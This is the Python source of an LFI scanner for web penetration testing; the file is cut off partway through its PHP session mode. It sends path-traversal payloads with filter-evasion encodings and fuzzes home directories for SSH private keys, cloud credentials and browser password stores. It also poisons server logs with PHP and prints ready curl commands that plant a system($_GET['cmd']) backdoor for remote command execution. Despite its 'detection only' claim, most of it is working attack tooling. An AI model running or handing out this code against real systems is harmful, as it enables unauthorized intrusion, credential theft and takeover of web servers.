#!/usr/bin/env python3
"""
LFI-Scanner – OSCP‑Safe LFI Enumeration Framework
Author: RevShellXD
License: MIT (Educational / Authorized Testing Only)

No automatic exploitation, no file downloads, no RCE.
All findings come with manual curl commands and exploitation steps.
"""

import http.client
import re
import sys
import os
import time
import random
import socket
import secrets
import urllib.parse
from urllib.parse import quote_plus, urlparse
from typing import Dict, List, Set, Optional, Tuple
from datetime import datetime

# Optional color support
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    COLORS = True
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''
    COLORS = False


class LFI_Scanner:
    """OSCP‑safe LFI enumeration – detection only, no exploitation."""

    def __init__(self):
        self.config = {
            # ---------- Core ----------
            'method': 'GET',
            'lfi_location': 'param',
            'cookie_name': None,
            'header_name': None,
            'os_type': 'linux',          # Default OS
            'traversal_depth': 6,
            'max_depth': 2,
            'timeout': 15,
            'rate_limit': 0.5,
            'proxy': None,
            'cookies': {},
            'headers': {},
            'follow_redirects': True,
            # ---------- Encoding ----------
            'encoding': 'none',
            'user_encoding': None,
            # ---------- Log poisoning ----------
            'log_vector': None,
            'log_header': None,
            'log_param': 'test',
            # ---------- Mode selection ----------
            'selected_mode': None,
        }

        self.user_agents = self._load_user_agents()
        self.request_count = 0
        self.session_cookies = {}

        # ---------- Windows fallback usernames (Mode 1) ----------
        self.WINDOWS_USER_FALLBACK = [
            'Public', 'Administrator', 'user', 'defaultuser0', 'test', 'vagrant', 'dev',
            'Matt', 'admin', 'backup', 'svc', 'service', 'sql', 'mysql', 'postgres',
            'tomcat', 'jenkins', 'git', 'ftp', 'www', 'web', 'deploy', 'app',
            'john', 'jane', 'support', 'sales', 'marketing', 'hr', 'finance',
            'operator', 'audit', 'sysadmin', 'root', 'guest', 'default', 'ssh', 'docker',
        ]

        # ---------- Linux Artifact Paths (Mode 1) ----------
        self.LINUX_ARTIFACTS = [
            '.ssh/id_rsa', '.ssh/id_dsa', '.ssh/id_ecdsa', '.ssh/id_ed25519',
            '.ssh/id_rsa.pub', '.ssh/id_dsa.pub', '.ssh/id_ecdsa.pub', '.ssh/id_ed25519.pub',
            '.ssh/authorized_keys', '.ssh/known_hosts', '.ssh/config',
            '.bash_history', '.netrc', '.git-credentials', '.aws/credentials',
            '.docker/config.json',
            '.mozilla/firefox/*/logins.json', '.mozilla/firefox/*/key4.db',
            '.config/google-chrome/Default/Login Data',
            '.config/chromium/Default/Login Data',
            '.config/BraveSoftware/Brave-Browser/Default/Login Data',
        ]

        # ---------- Windows Artifact Paths (Mode 1, relative to Users/username/) ----------
        self.WINDOWS_ARTIFACTS = [
            '.ssh/id_rsa', '.ssh/id_ecdsa', '.ssh/id_ed25519',
            '.ssh/id_rsa.ppk', '.ssh/id_rsa.pub', '.ssh/authorized_keys',
            'putty/id_rsa.ppk', 'putty/private.ppk',
            'Desktop/*.ppk', 'Documents/*.ppk', 'Downloads/*.ppk',
            'AppData/Roaming/WinSCP.ini',
            'AppData/Roaming/FileZilla/recentservers.xml',
            'AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json',
            'AppData/Local/Google/Chrome/User Data/Default/Login Data',
            'AppData/Local/Microsoft/Edge/User Data/Default/Login Data',
            'AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data',
        ]

        # ---------- Log Paths (Mode 2) ----------
        self.LOG_PATHS = {
            'linux': [
                'var/log/apache2/access.log', 'var/log/apache2/error.log',
                'var/log/httpd/access_log', 'var/log/httpd/error_log',
                'var/log/nginx/access.log', 'var/log/nginx/error.log',
                'var/log/auth.log', 'var/log/secure', 'var/log/sshd.log',
                'var/log/syslog', 'var/log/messages',
            ],
            'windows': [
                'xampp/apache/logs/access.log', 'xampp/apache/logs/error.log',
                'wamp64/logs/access.log', 'wamp64/logs/apache_error.log',
                'inetpub/logs/LogFiles/W3SVC1/u_ex%y%m%d.log',
                'Windows/System32/LogFiles/HTTPERR/httperr*.log',
                'nginx/logs/access.log',
            ]
        }

        # ---------- PHPInfo Wordlists (Mode 3) ----------
        self.LINUX_PHPINFO_PATHS = [
            'phpinfo.php', 'info.php', 'test.php', 'i.php', 'p.php', 'php.php',
            'phpinfo.php.bak', 'info.php.bak',
            'admin/phpinfo.php', 'public/phpinfo.php', 'uploads/phpinfo.php',
        ]
        self.WINDOWS_PHPINFO_PATHS = [
            'phpinfo.php', 'info.php', 'test.php', 'i.php', 'php.php',
            'xampp/phpinfo.php', 'xampp/htdocs/phpinfo.php',
            'wamp/www/phpinfo.php', 'iisstart.php',
        ]

        # ---------- Upload Wordlist (Mode 4) ----------
        self.UPLOAD_WORDLIST = [
            'uploads/shell.php', 'uploads/cmd.php', 'uploads/backdoor.php',
            'images/shell.php', 'files/shell.php', 'user_uploads/shell.php',
            'avatars/shell.php', 'profile_pics/shell.php', 'tmp/shell.php',
        ]

        # ---------- Session Paths (Mode 5) ----------
        self.LINUX_SESSION_PATHS = [
            '/tmp/', '/var/lib/php/sessions/', '/var/lib/php5/',
            '/var/lib/php/session/', '/var/lib/php7/', '/var/lib/php8/',
        ]
        self.WINDOWS_SESSION_PATHS = [
            'C:/Windows/Temp/', 'C:/xampp/tmp/', 'C:/wamp64/tmp/',
            'Windows/Temp/', 'xampp/tmp/',
        ]

        # ---------- Patterns for PHP "file not found" errors ----------
        self.NOT_FOUND_PATTERNS = [
            'failed to open stream', 'No such file', 'Permission denied',
            'include(): Failed opening'
        ]

        # ---------- Color setup ----------
        if COLORS:
            self.colors = {
                'info': Fore.CYAN,
                'success': Fore.GREEN + Style.BRIGHT,
                'warning': Fore.YELLOW,
                'error': Fore.RED + Style.BRIGHT,
                'debug': Fore.MAGENTA,
                'highlight': Fore.WHITE + Style.BRIGHT,
                'banner': Fore.BLUE + Style.BRIGHT,
            }
        else:
            self.colors = {k: '' for k in self.colors.keys()}

    # -------------------------------------------------------------------------
    #   Helper Functions
    # -------------------------------------------------------------------------
    def _load_user_agents(self) -> List[str]:
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'curl/7.88.1',
        ]

    def _get_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def _apply_rate_limit(self):
        if self.config['rate_limit'] > 0:
            time.sleep(self.config['rate_limit'])

    def _print(self, msg: str, level: str = 'info', end: str = '\n'):
        color = self.colors.get(level, '')
        reset = Style.RESET_ALL if COLORS else ''
        print(f"{color}{msg}{reset}", end=end)

    # -------------------------------------------------------------------------
    #   Encoding – Preserves dots, no backslashes
    # -------------------------------------------------------------------------
    def encode_payload(self, payload: str, encoding: str, user_encoding: str = None) -> str:
        """Apply selected encoding – forward‑slash only."""
        traversal = '../'
        if encoding == 'none':
            return payload
        elif encoding == 'single':
            reps = [
                (traversal, '%2e%2e%2f'),
                (traversal, '..%2f'),
                (traversal, '%2e%2e/'),
            ]
            for p, r in reps:
                payload = payload.replace(p, r)
            return payload
        elif encoding == 'double':
            return payload.replace(traversal, '%252e%252e%252f')
        elif encoding == 'custom_double':
            return payload.replace(traversal, '%%32%65%%32%65/')
        elif encoding == 'unicode':
            reps = [
                (traversal, '..∕'), (traversal, '..／'), (traversal, '..⧸'),
                (traversal, '%u002e%u002e/'), (traversal, '%c0%ae%c0%ae%c0%af'),
            ]
            for p, r in reps:
                payload = payload.replace(p, r)
            return payload
        elif encoding == 'user_custom' and user_encoding:
            return payload.replace(traversal, user_encoding)
        return payload

    # -------------------------------------------------------------------------
    #   HTTP Request Handler
    # -------------------------------------------------------------------------
    def _create_connection(self, protocol: str, host: str, port: int):
        if self.config['proxy'] and protocol == 'http':
            p = urlparse(self.config['proxy'])
            return http.client.HTTPConnection(p.hostname, p.port or 8080, timeout=self.config['timeout'])
        if protocol == 'https':
            return http.client.HTTPSConnection(host, port, timeout=self.config['timeout'])
        return http.client.HTTPConnection(host, port, timeout=self.config['timeout'])

    def send_http_request(self, protocol: str, host: str, port: int, path: str,
                          body: str = None, verbose: bool = False) -> Tuple[Optional[int], Optional[str]]:
        self.request_count += 1
        self._apply_rate_limit()
        try:
            headers = {
                'User-Agent': self._get_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'close',
                'Cache-Control': 'no-cache',
            }
            headers.update(self.config['headers'])
            if self.config['cookies']:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.config['cookies'].items())
            elif self.session_cookies:
                headers['Cookie'] = '; '.join(f"{k}={v}" for k, v in self.session_cookies.items())

            conn = self._create_connection(protocol, host, port)
            conn.request(self.config['method'], path, body=body, headers=headers)
            resp = conn.getresponse()
            status = resp.status

            if status in [301, 302, 303, 307, 308] and self.config['follow_redirects']:
                loc = resp.getheader('Location')
                if loc:
                    conn.close()
                    if loc.startswith('http'):
                        u = urlparse(loc)
                        return self.send_http_request(
                            u.scheme, u.hostname, u.port or (443 if u.scheme == 'https' else 80),
                            u.path + ('?' + u.query if u.query else ''), body, verbose
                        )
                    elif loc.startswith('/'):
                        return self.send_http_request(protocol, host, port, loc, body, verbose)

            content = resp.read()
            if resp.getheader('Content-Encoding') == 'gzip':
                import gzip, io
                content = gzip.GzipFile(fileobj=io.BytesIO(content)).read()
            content = content.decode('utf-8', errors='ignore')

            set_cookie = resp.getheader('Set-Cookie')
            if set_cookie:
                parts = set_cookie.split(';')[0].split('=')
                if len(parts) == 2:
                    self.session_cookies[parts[0].strip()] = parts[1].strip()
            conn.close()
            return status, content
        except Exception as e:
            if verbose:
                self._print(f"[DEBUG] Request error for {path}: {e}", 'debug')
            return None, None

    # -------------------------------------------------------------------------
    #   LFI Injection – Preserves dots, always URL‑encodes if encoding='none'
    # -------------------------------------------------------------------------
    def _inject_lfi_payload(self, payload: str, base_url: str, param_name: str = None) -> str:
        loc = self.config['lfi_location']
        if loc == 'param':
            if self.config['encoding'] == 'none':
                safe_chars = '._-~'
                encoded = urllib.parse.quote(payload, safe=safe_chars)
                return f"{base_url}?{param_name}={encoded}"
            else:
                return f"{base_url}?{param_name}={payload}"
        elif loc == 'cookie':
            name = self.config['cookie_name'] or param_name or 'file'
            self.config['cookies'][name] = payload
            return base_url
        elif loc == 'header':
            name = self.config['header_name'] or param_name or 'X-LFI'
            self.config['headers'][name] = payload
            return base_url
        return base_url

    # -------------------------------------------------------------------------
    #   Directory Listing Detection
    # -------------------------------------------------------------------------
    def is_directory_listing(self, content: str) -> bool:
        patterns = [
            r'<title>\s*Index of',
            r'Directory listing for',
            r'Parent Directory</a>',
            r'<img src="[^"]*blank\.(gif|png|ico)"',
            r'Last modified</th>',
            r'<a href="\?C=[A-Z];O=[A-Z]">',
        ]
        return sum(1 for p in patterns if re.search(p, content, re.IGNORECASE)) >= 2

    def extract_filenames_from_listing(self, content: str) -> List[str]:
        files = []
        for pat in [r'href="([^"?][^"]*)"', r'>\s*([^<\s]+?)\s*</a>', r'<td><a[^>]*>([^<]+)</a></td>']:
            for m in re.findall(pat, content, re.IGNORECASE):
                if isinstance(m, tuple):
                    f = m[0] or m[1]
                else:
                    f = m
                if f and f not in ['../', './', '/', '..', '.'] and not f.startswith('?'):
                    clean = f.split('"')[0].split('#')[0].split('?')[0]
                    if clean and clean.lower() not in ['name', 'last modified', 'size']:
                        files.append(clean)
        return list(set(files))

    # -------------------------------------------------------------------------
    #   User Enumeration (Linux)
    # -------------------------------------------------------------------------
    def parse_passwd(self, content: str) -> List[Dict]:
        users = []
        for line in content.splitlines():
            parts = line.split(':')
            if len(parts) < 7:
                continue
            u, _, _, _, _, home, shell = parts
            if u and u != 'root' and shell not in ['/usr/sbin/nologin', '/bin/false', '/sbin/nologin']:
                users.append({'username': u, 'home': home})
        return users

    # -------------------------------------------------------------------------
    #   Artifact Detection (SSH, credentials)
    # -------------------------------------------------------------------------
    def is_ssh_artifact(self, content: str) -> bool:
        priv = [
            r'-----BEGIN [A-Z ]*PRIVATE KEY-----',
            r'BEGIN OPENSSH PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'BEGIN DSA PRIVATE KEY',
            r'BEGIN EC PRIVATE KEY',
        ]
        pub = ['ssh-rsa', 'ssh-ed25519', 'ecdsa-sha2-nistp256', 'ssh-dss']
        for p in priv:
            if re.search(p, content):
                return True
        for line in content.splitlines():
            line = line.strip()
            for p in pub:
                if line.startswith(p):
                    return True
        if re.search(r'^\S+ (ssh-(rsa|dss|ed25519) )?AAAA[^ ]+', content, re.MULTILINE):
            return True
        return False

    # -------------------------------------------------------------------------
    #   Mode 1 – SSH / Browser Artifact Fuzzing (OS‑specific)
    # -------------------------------------------------------------------------
    def _fuzz_user_home(self, config: Dict, user: Dict, suffixes: List[str]):
        """Recursively fuzz a user's home directory for artifacts."""
        if config['os_type'] == 'linux':
            home = user['home']
            if not home.endswith('/'):
                home += '/'
            clean_home = home.lstrip('/')
        else:
            clean_home = f"Users/{user['username']}/"

        # Check if home directory exists (skip on 404 OR PHP error)
        home_path = config['traversal_prefix'] + clean_home
        if not home_path.endswith('/'):
            home_path += '/'

        if config['lfi_type'] == 'path':
            enc_home = self.encode_payload(home_path, config['encoding'], config['user_encoding']).lstrip('/')
            home_url = config['base_url'].rstrip('/') + '/' + enc_home
        else:
            enc_home = self.encode_payload(home_path, config['encoding'], config['user_encoding'])
            home_url = self._inject_lfi_payload(enc_home, config['base_url'], config['param_name'])

        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 home_url, verbose=config['verbose'])
        content_not_found = any(p in content for p in self.NOT_FOUND_PATTERNS)
        if status == 404 or content_not_found:
            if config['verbose']:
                self._print(f"[-] Skipping {user['username']}: home directory not found (status {status})", 'debug')
            return

        self._print(f"[*] Scanning user {user['username']}...", 'info')
        visited = set()

        for suffix in suffixes:
            suffix_clean = suffix.lstrip('/')
            full_path = config['traversal_prefix'] + clean_home + suffix_clean
            self._recursive_artifact_check(config, user['username'], full_path, 0,
                                           config['max_depth'], visited, config['lfi_type'],
                                           config['param_name'], config['verbose'])

        # Also fuzz .ssh directory recursively
        ssh_dir = config['traversal_prefix'] + clean_home + '.ssh/'
        self._recursive_artifact_check(config, user['username'], ssh_dir, 0,
                                       config['max_depth'], visited, config['lfi_type'],
                                       config['param_name'], config['verbose'])

    def _recursive_artifact_check(self, config: Dict, user: str, path: str,
                                   depth: int, max_depth: int, visited: Set,
                                   lfi_type: str, param_name: str = None, verbose: bool = False):
        if depth > max_depth or path in visited:
            return
        visited.add(path)

        encoded = self.encode_payload(path, config['encoding'], config['user_encoding']).lstrip('/')
        if lfi_type == 'path':
            full = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        else:
            full = self._inject_lfi_payload(encoded, config['base_url'], param_name)

        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 full, verbose=verbose)
        if status is None or status == 404:
            return
        if status not in [200, 403, 400, 401, 500, 301, 302, 206]:
            return

        if path.endswith('/') and self.is_directory_listing(content):
            self._print(f"[*] Directory listing at {full} (depth {depth})", 'info')
            for fname in self.extract_filenames_from_listing(content):
                if fname in ['../', './', '/', '..', '.']:
                    continue
                new = path + fname if not fname.startswith('/') else fname.lstrip('/')
                if fname.endswith('/') and not new.endswith('/'):
                    new += '/'
                self._recursive_artifact_check(config, user, new, depth + 1, max_depth,
                                               visited, lfi_type, param_name, verbose)
        else:
            if self.is_ssh_artifact(content):
                self._print(f"\n[!] Possible SSH artifact found for user {user}!", 'success')
                self._print(f"    URL: {full}", 'info')
                safe_filename = f"{user}_{os.path.basename(path) or 'unknown'}"
                self._print(f"    Retrieve with: curl -k '{full}' -o {safe_filename}", 'info')

    def mode1_ssh_fuzzing(self, config: Dict):
        """Mode 1: SSH / Browser artifact fuzzing (detection only)."""
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 1: SSH / BROWSER ARTIFACT FUZZING", 'highlight')
        self._print("=" * 60, 'highlight')

        # Verify LFI first
        if config['os_type'] == 'linux':
            test_file = 'etc/passwd'
            valid_str = 'root:x:0:0'
        else:
            test_file = 'Windows/win.ini'
            valid_str = '[fonts]'

        lfi_payload = config['traversal_prefix'] + test_file
        encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
        if config['lfi_type'] == 'path':
            test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        else:
            test_url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

        self._print(f"[*] Testing LFI with {test_file}...", 'info')
        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 test_url, verbose=config['verbose'])
        if status != 200 or not content or valid_str not in content:
            self._print(f"[-] LFI verification failed. HTTP {status}", 'error')
            return

        self._print("[+] LFI confirmed!", 'success')

        # ---------- User enumeration ----------
        if config['os_type'] == 'linux':
            users = self.parse_passwd(content)
            valid_users = [u for u in users if u['home'].startswith('/home/') or u['home'] == '/root']
            if not valid_users:
                self._print("[-] No valid users with home directories found.", 'error')
                return
            self._print(f"[+] Found {len(valid_users)} valid users:", 'success')
            for u in valid_users:
                self._print(f"  • {u['username']}: {u['home']}", 'info')
        else:
            # Windows: fallback usernames (dynamic directory listing not required)
            user_dirs = self.WINDOWS_USER_FALLBACK
            self._print(f"[*] Using fallback list of {len(user_dirs)} common Windows usernames", 'info')
            valid_users = [{'username': u, 'home': f'Users/{u}/'} for u in user_dirs]

        # ---------- Select artifact wordlist ----------
        if config['os_type'] == 'linux':
            suffixes = self.LINUX_ARTIFACTS
            self._print(f"[*] Using Linux artifact wordlist ({len(suffixes)} paths)", 'info')
        else:
            suffixes = self.WINDOWS_ARTIFACTS
            self._print(f"[*] Using Windows artifact wordlist ({len(suffixes)} paths)", 'info')

        # ---------- Start fuzzing ----------
        self._print(f"\n[*] Starting artifact fuzzing for {len(valid_users)} users...", 'info')
        for user in valid_users:
            self._fuzz_user_home(config, user, suffixes)

        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 1 SCAN COMPLETE", 'highlight')
        self._print(f"Total requests: {self.request_count}", 'info')

    # -------------------------------------------------------------------------
    #   Mode 2 – Log Poisoning Detection (No exploitation)
    # -------------------------------------------------------------------------
    def mode2_log_poisoning_detection(self, config: Dict):
        """Mode 2: Inject harmless token, check if it appears in log files."""
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 2: LOG POISONING DETECTION", 'highlight')
        self._print("=" * 60, 'highlight')

        # Verify LFI first (needed to include logs)
        if config['os_type'] == 'linux':
            test_file = 'etc/passwd'
            valid_str = 'root:x:0:0'
        else:
            test_file = 'Windows/win.ini'
            valid_str = '[fonts]'

        lfi_payload = config['traversal_prefix'] + test_file
        encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
        if config['lfi_type'] == 'path':
            test_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        else:
            test_url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

        self._print(f"[*] Verifying LFI with {test_file}...", 'info')
        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 test_url, verbose=config['verbose'])
        if status != 200 or not content or valid_str not in content:
            self._print(f"[-] LFI verification failed. Cannot include log files.", 'error')
            return
        self._print("[+] LFI confirmed.", 'success')

        # Select injection vector (set in interactive_setup)
        vector = self.config.get('log_vector', 'ua')

        # Generate unique test token
        token = "LFI_TEST_" + secrets.token_hex(8)
        php_test = f"<?php echo '{token}'; ?>"

        # Build log path list
        log_paths = self.LOG_PATHS.get(config['os_type'], [])
        self._print(f"[*] Testing {len(log_paths)} log file paths", 'info')
        self._print(f"[*] Injection vector: {vector}", 'info')
        self._print(f"[*] Test token: {token}", 'debug')

        # Inject test payload
        self._print("[*] Injecting test payload...", 'info')
        inject_success = self._inject_log_payload(config, php_test)
        if not inject_success:
            self._print("[-] Injection request failed.", 'error')
            return

        self._print("[*] Payload injected. Waiting 2 seconds for logs to flush...", 'info')
        time.sleep(2)

        # Try to include each log file and look for token
        found_log = None
        for log_path in log_paths:
            if self._check_log_for_token(config, log_path, token):
                found_log = log_path
                break

        if not found_log:
            self._print("[-] No writable log file found with current injection vector.", 'warning')
            return

        # Print manual exploitation instructions
        self._print(f"\n[!] WRITABLE LOG FILE FOUND: {found_log}", 'success')
        self._print("\n" + "=" * 60)
        self._print("MANUAL EXPLOITATION STEPS", 'highlight')
        self._print("=" * 60)
        self._print("1. Inject a PHP backdoor using the same injection vector:")
        if vector == 'ua':
            self._print(f"   curl -A '<?php system($_GET[\"cmd\"]); ?>' {config['base_url']}")
        elif vector == 'referer':
            self._print(f"   curl -e '<?php system($_GET[\"cmd\"]); ?>' {config['base_url']}")
        elif vector == 'xff':
            self._print(f"   curl -H 'X-Forwarded-For: <?php system($_GET[\"cmd\"]); ?>' {config['base_url']}")
        elif vector == 'param':
            param = self.config.get('log_param', 'test')
            self._print(f"   curl '{config['base_url']}?{param}={quote_plus('<?php system($_GET[\"cmd\"]); ?>')}'")
        else:
            self._print("   (Inject PHP code via the chosen vector)")

        self._print("\n2. Execute commands via LFI:")
        lfi_payload = config['traversal_prefix'] + found_log.lstrip('/')
        encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
        if config['lfi_type'] == 'path':
            cmd_url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/') + '?cmd=id'
        else:
            base = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])
            if '?' in base:
                cmd_url = base + '&cmd=id'
            else:
                cmd_url = base + '?cmd=id'
        self._print(f"   curl '{cmd_url}'")
        self._print("\n3. Replace 'id' with any command you wish to execute.")
        self._print("=" * 60)

    def _inject_log_payload(self, config: Dict, payload: str) -> bool:
        """Inject payload via configured vector."""
        url = config['base_url'].rstrip('/') + '/'
        vector = self.config['log_vector']

        # Save original headers/cookies
        orig_headers = self.config['headers'].copy()
        orig_cookies = self.config['cookies'].copy()

        if vector == 'ua':
            self.config['headers']['User-Agent'] = payload
        elif vector == 'referer':
            self.config['headers']['Referer'] = payload
        elif vector == 'xff':
            self.config['headers']['X-Forwarded-For'] = payload
        elif vector == 'param':
            param = self.config.get('log_param', 'test')
            url += f"?{param}={quote_plus(payload)}"

        status, _ = self.send_http_request(config['protocol'], config['host'], config['port'],
                                           url, verbose=config['verbose'])

        # Restore
        self.config['headers'] = orig_headers
        self.config['cookies'] = orig_cookies
        return status is not None and status < 500

    def _check_log_for_token(self, config: Dict, log_path: str, token: str) -> bool:
        """Attempt to read log file via LFI and check for token."""
        lfi_payload = config['traversal_prefix'] + log_path.lstrip('/')
        encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
        if config['lfi_type'] == 'path':
            full = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
        else:
            full = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

        status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                 full, verbose=config['verbose'])
        if status == 200 and content and token in content:
            self._print(f"[+] Log file {log_path} contains token!", 'success')
            return True
        return False

    # -------------------------------------------------------------------------
    #   Mode 3 – phpinfo() Scanner (Race Condition Detection)
    # -------------------------------------------------------------------------
    def mode3_phpinfo_scanner(self, config: Dict):
        """Mode 3: Find phpinfo.php, check if file_uploads=On, print exploit guide."""
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 3: PHPINFO SCANNER", 'highlight')
        self._print("=" * 60, 'highlight')

        # Derive root URL from base_url
        parsed = urlparse(config['base_url'])
        root_url = f"{parsed.scheme}://{parsed.netloc}/"
        wordlist = self.LINUX_PHPINFO_PATHS if config['os_type'] == 'linux' else self.WINDOWS_PHPINFO_PATHS

        self._print(f"[*] Bruteforcing phpinfo.php ({len(wordlist)} paths) ...", 'info')
        found = False
        for path in wordlist:
            url = root_url + path
            status, content = self.send_http_request(parsed.scheme, parsed.hostname,
                                                     parsed.port or 80, '/' + path,
                                                     verbose=config['verbose'])
            if status == 200 and 'PHP Version' in content and '<title>phpinfo()' in content:
                self._print(f"[+] Found phpinfo.php at {url}", 'success')
                found = True
                self._analyze_phpinfo(content, config)
                break

        if not found:
            self._print("[-] No phpinfo.php found.", 'error')

    def _analyze_phpinfo(self, html: str, config: Dict):
        """Parse phpinfo for upload configuration and print exploit steps."""
        upload_match = re.search(r'upload_max_filesize.*?class="v">(\d+)([KMG])?<', html, re.IGNORECASE)
        post_match = re.search(r'post_max_size.*?class="v">(\d+)([KMG])?<', html, re.IGNORECASE)
        doc_root_match = re.search(r'DOCUMENT_ROOT.*?class="v">(.+?)<', html, re.IGNORECASE)

        if upload_match:
            upload_val = upload_match.group(1) + (upload_match.group(2) or '')
            self._print(f"[+] upload_max_filesize = {upload_val}", 'info')
        else:
            self._print("[-] upload_max_filesize not found – file_uploads = Off", 'warning')

        if post_match:
            post_val = post_match.group(1) + (post_match.group(2) or '')
            self._print(f"[+] post_max_size = {post_val}", 'info')
        else:
            self._print("[-] post_max_size not found", 'warning')

        if doc_root_match:
            doc_root = doc_root_match.group(1).strip()
            self._print(f"[+] DOCUMENT_ROOT = {doc_root}", 'info')

        if upload_match and post_match:
            # Simple size comparison heuristic
            self._print("\n[!] This server MAY be vulnerable to the phpinfo() race condition LFI2RCE.", 'success')
            self._print("\n" + "=" * 60)
            self._print("MANUAL EXPLOITATION STEPS", 'highlight')
            self._print("=" * 60)
            self._print("1. Prepare a PHP shell (e.g., '<?php system($_GET[\"cmd\"]); ?>')")
            self._print("2. Send a large POST upload to any PHP endpoint, with very long headers to keep the request alive.")
            self._print("3. While the upload is still processing, fetch phpinfo() and extract the temporary file path (e.g., /tmp/phpXXXXXX).")
            self._print("4. Immediately include that path via LFI to execute the shell:")
            lfi_url = config['base_url']
            if config['lfi_type'] == 'param':
                lfi_url += f"?{config['param_name']}=[TMP_PATH]"
            else:
                lfi_url += "/[TRAVERSAL][TMP_PATH]"
            self._print(f"   Example: curl '{lfi_url}?cmd=id'")
            self._print("\nTools like 'lfito_rce.py' can automate this process.")
            self._print("=" * 60)

    # -------------------------------------------------------------------------
    #   Mode 4 – Uploaded File Scanner
    # -------------------------------------------------------------------------
    def mode4_upload_scanner(self, config: Dict):
        """Mode 4: Check for existence of uploaded PHP shells."""
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 4: UPLOADED FILE SCANNER", 'highlight')
        self._print("=" * 60, 'highlight')
        self._print("[*] This mode checks if a PHP file exists at a given path.", 'info')
        self._print("[*] It does NOT attempt to execute it.\n", 'info')

        choice = input("Enter path to uploaded file (relative to web root), or 'brute' to try common locations: ").strip()
        paths_to_try = []
        if choice.lower() == 'brute':
            paths_to_try = self.UPLOAD_WORDLIST
            self._print(f"[*] Brute‑forcing {len(paths_to_try)} common upload paths...", 'info')
        else:
            paths_to_try = [choice.lstrip('/')]

        for path in paths_to_try:
            lfi_payload = config['traversal_prefix'] + path
            encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
            if config['lfi_type'] == 'path':
                url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

            self._print(f"[*] Checking {path} ...", 'info')
            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     url, verbose=config['verbose'])
            if status == 200 and content and '<?php' in content[:100]:
                self._print(f"\n[!] PHP file found at: {path}", 'success')
                self._print(f"    URL: {url}", 'info')
                safe_filename = os.path.basename(path) or 'shell.php'
                self._print(f"    Retrieve with: curl -k '{url}' -o {safe_filename}", 'info')
                break
        else:
            self._print("[-] No readable PHP file found.", 'warning')

    # -------------------------------------------------------------------------
    #   Mode 5 – PHP Session Enumeration
    # -------------------------------------------------------------------------
    def mode5_session_enum(self, config: Dict):
        """Mode 5: Read PHP session files."""
        self._print("\n" + "=" * 60, 'highlight')
        self._print("[*] MODE 5: PHP SESSION ENUMERATION", 'highlight')
        self._print("=" * 60, 'highlight')

        # Determine session save path
        session_path = None
        # Use fallback wordlist
        wordlist = self.LINUX_SESSION_PATHS if config['os_type'] == 'linux' else self.WINDOWS_SESSION_PATHS
        for path in wordlist:
            self._print(f"[*] Trying session path: {path}", 'info')
            # Try to read a beacon file (sess_ with random ID) to check existence
            test_file = path.rstrip('/') + '/sess_' + 'a' * 32
            lfi_payload = config['traversal_prefix'] + test_file.lstrip('/')
            encoded = self.encode_payload(lfi_payload, config['encoding'], config['user_encoding'])
            if config['lfi_type'] == 'path':
                url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

            status, content = self.send_http_request(config['protocol'], config['host'], config['port'],
                                                     url, verbose=config['verbose'])
            if status == 200 and 'sess_' in url and len(content) > 0:
                self._print(f"[+] Session directory is readable: {path}", 'success')
                session_path = path
                break
        else:
            self._print("[-] Could not determine session save path.", 'error')
            return

        # Get session ID from user
        sid = input("\nEnter session ID (PHPSESSID) to retrieve, or 'list' to attempt directory listing: ").strip()
        if sid.lower() == 'list':
            # Try directory listing
            dir_path = config['traversal_prefix'] + session_path.lstrip('/')
            encoded = self.encode_payload(dir_path, config['encoding'], config['user_encoding'])
            if config['lfi_type'] == 'path':
                url = config['base_url'].rstrip('/') + '/' + encoded.lstrip('/')
            else:
                url = self._inject_lfi_payload(encoded, config['base_url'], config['param_name'])

